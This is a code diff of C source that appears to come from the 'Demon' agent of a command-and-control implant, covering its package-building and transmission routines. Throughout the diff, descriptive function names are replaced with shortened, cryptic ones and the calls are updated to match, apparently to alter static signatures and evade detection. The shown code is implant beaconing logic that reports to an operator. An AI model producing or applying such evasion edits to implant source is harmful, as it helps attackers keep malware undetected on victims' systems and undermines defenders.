@@ -46,7 +46,7 @@ VOID Int32ToBuffer(
     ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
 }
 
-VOID PackageAddInt32(
+VOID PkgAdIn32(
     _Inout_ PPACKAGE Package,
     IN     UINT32   Data
 ) {
@@ -106,7 +106,7 @@ VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
     PackageAddInt64( Package, ( UINT64 ) pointer );
 }
 
-VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
+VOID PkgAdPa( PPACKAGE Package, PCHAR Data, SIZE_T Size )
 {
     if ( ! Package )
         return;
@@ -128,7 +128,7 @@ VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
         return;
     }
 
-    PackageAddInt32( Package, Size );
+    PkgAdIn32( Package, Size );
 
     if ( Size )
     {
@@ -171,15 +171,15 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     return Package;
 }
 
-PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
+PPACKAGE PkgCreWiMetDat( UINT32 CommandID )
 {
     PPACKAGE Package = PackageCreate( CommandID );
 
-    PackageAddInt32( Package, 0 ); // package length
-    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance->Session.AgentID );
-    PackageAddInt32( Package, Package->CommandID );
-    PackageAddInt32( Package, Package->RequestID );
+    PkgAdIn32( Package, 0 ); // package length
+    PkgAdIn32( Package, DEMON_MAGIC_VALUE );
+    PkgAdIn32( Package, Instance->Session.AgentID );
+    PkgAdIn32( Package, Package->CommandID );
+    PkgAdIn32( Package, Package->RequestID );
 
     return Package;
 }
@@ -309,8 +309,8 @@ VOID PackageTransmit(
 
             // notify the operator that a package was discarded
             Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
-            PackageAddInt32( Package, Length );
-            PackageAddInt32( Package, PIPE_BUFFER_MAX );
+            PkgAdIn32( Package, Length );
+            PkgAdIn32( Package, PIPE_BUFFER_MAX );
         }
 #endif
 
@@ -349,7 +349,7 @@ BOOL PackageTransmitAll(
         return TRUE;
 #endif
 
-    Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );
+    Package = PkgCreWiMetDat( DEMON_COMMAND_GET_JOB );
 
     // add all the packages we want to send to the main package
     while ( Pkg )
@@ -360,8 +360,8 @@ BOOL PackageTransmitAll(
             break;
 #endif
 
-        PackageAddInt32( Package, Pkg->CommandID );
-        PackageAddInt32( Package, Pkg->RequestID );
+        PkgAdIn32( Package, Pkg->CommandID );
+        PkgAdIn32( Package, Pkg->RequestID );
         PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
         Pkg->Included = TRUE;
 
@@ -478,8 +478,8 @@ VOID PackageTransmitError(
 
     Package = PackageCreate( DEMON_ERROR );
 
-    PackageAddInt32( Package, ID );
-    PackageAddInt32( Package, ErrorCode );
+    PkgAdIn32( Package, ID );
+    PkgAdIn32( Package, ErrorCode );
     PackageTransmit( Package );
 }
 
